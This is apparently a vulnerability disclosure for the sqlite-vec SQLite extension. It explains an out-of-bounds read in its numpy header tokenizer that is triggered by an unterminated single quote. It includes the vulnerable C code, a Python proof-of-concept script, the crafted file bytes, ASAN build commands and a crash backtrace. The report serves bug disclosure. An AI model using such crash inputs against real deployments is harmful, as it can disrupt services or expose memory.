version: 0.1.1

tag: OOBR, VectorDB, Parse

https://github.com/asg017/sqlite-vec


A vector search SQLite extension which has 3.6k stars. It can load numpy file.

```c
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2473C1-L2478C2
void npy_scanner_init(struct NpyScanner *scanner, const unsigned char *source,
                      int source_length) {
  scanner->start = (unsigned char *)source;
  scanner->end = (unsigned char *)source + source_length;
  scanner->ptr = (unsigned char *)source;
}

// https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2489C1-L2500C70
int parse_npy_header(sqlite3_vtab *pVTab, const unsigned char *header,
                     size_t headerLength,
                     enum VectorElementType *out_element_type,
                     int *fortran_order, size_t *numElements,
                     size_t *numDimensions) {

  struct NpyScanner scanner;
  struct NpyToken token;
  int rc;
  npy_scanner_init(&scanner, header, headerLength);

  if (npy_scanner_next(&scanner, &token) != VEC0_TOKEN_RESULT_SOME &&  //<-----[1]
    ...
```

The function `parse_npy_header` is used to parse the numpy file. It uses `scanner` to record the position.
`npy_scanner_next` continues to call `npy_token_next`.

```c
//https://github.com/asg017/sqlite-vec/blob/main/sqlite-vec.c#L2390
int npy_token_next(unsigned char *start, unsigned char *end,
                   struct NpyToken *out) {
  unsigned char *ptr = start;
  while (ptr < end) {
    unsigned char curr = *ptr;
    if (is_whitespace(curr)) {
      ptr++;
      continue;
    } else if (curr == '(') {
      ...
    } else if (curr == '\'') {
      unsigned char *start = ptr;
      ptr++;
      while (ptr < end) {  //<----------------[2]
        if ((*ptr) == '\'') {
          break;
        }
        ptr++;            
      }
      if ((*ptr) != '\'') {     //<----------------[3]
        return VEC0_TOKEN_RESULT_ERROR;
      }
      out->start = start;
      out->end = ++ptr;
      out->token_type = NPY_TOKEN_TYPE_STRING;
      return VEC0_TOKEN_RESULT_SOME;
    } else if (curr == 'F' &&
        ...
    } else if (is_digit(curr)) {
        ...
    } else {
      return VEC0_TOKEN_RESULT_ERROR;
    }
  }
  return VEC0_TOKEN_RESULT_ERROR;
}
```

In npy_token_next, a problem occurs in the parsing of `'`. When the first `'` appears, it continues to scan forward, attempting to find the second `'`, but if there is no matching single quote for the first `'` in the entire data, it will exit the while loop, at which point `ptr==end`, pointing to the next address in the data space, i.e., an illegal address, which causes an out-of-bounds read at [3]. 


Poc code:

```python
import sqlite3

def execute_all(cursor, sql, args=None):
    if args is None:
        args = []
    results = cursor.execute(sql, args).fetchall()
    return list(map(lambda x: dict(x), results))

def connect(ext, path=":memory:", extra_entrypoint=None):
    db = sqlite3.connect(path)
    db.enable_load_extension(True)
    db.load_extension(ext)
    db.row_factory = sqlite3.Row
    return db

db = connect("./dist/vec0")

vec_npy_each_f = lambda *args: execute_all(
    db, "select * from vec_npy_each(?)", args
)

with open("./poc.npy", "rb") as f:
    data = f.read()
    print(vec_npy_each_f(data))
```

Poc data:
`00000000: 934e 554d 5059 0000 0200 2722            .NUMPY....'"`


Poc env:

We should compile with ASAN: `clang -fPIC -shared -Wall -Wextra -g -O0 -lm -lsqlite3 sqlite-vec.c -o dist/vec0.so`.  
Then, install python library sqlite-vec.  
Last, run `LD_PRELOAD=/usr/lib/llvm-14/lib/clang/14.0.0/lib/linux/libclang_rt.asan-x86_64.so python3 poc.py -detect_leaks=0`

Backtrace:
```
=================================================================
==829223==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000003c at pc 0x555555b71042 bp 0x7fffffff3db0 sp 0x7fffffff3da8
READ of size 1 at 0x60200000003c thread T0
[Detaching after fork from child process 829233]
    #0 0x555555b71041 in npy_token_next /sqlite-vec/sqlite-vec.c:2437:12
    #1 0x555555b717be in npy_scanner_next /sqlite-vec/sqlite-vec.c:2481:12
    #2 0x555555b71a9a in parse_npy_header /sqlite-vec/sqlite-vec.c:2500:7
    #3 0x555555b743bf in parse_npy_buffer /sqlite-vec/sqlite-vec.c:2808:12
    #4 0x555555b9c35d in vec_npy_eachFilter /sqlite-vec/sqlite-vec.c:2967:10
    #5 0x555555891c5b in sqlite3VdbeExec /sqlite-vec/vendor/sqlite3.c:101441:8
    #6 0x5555557875cd in sqlite3Step /sqlite-vec/vendor/sqlite3.c:91222:10
    #7 0x5555557730a4 in sqlite3_step /sqlite-vec/vendor/sqlite3.c:91283:16
```

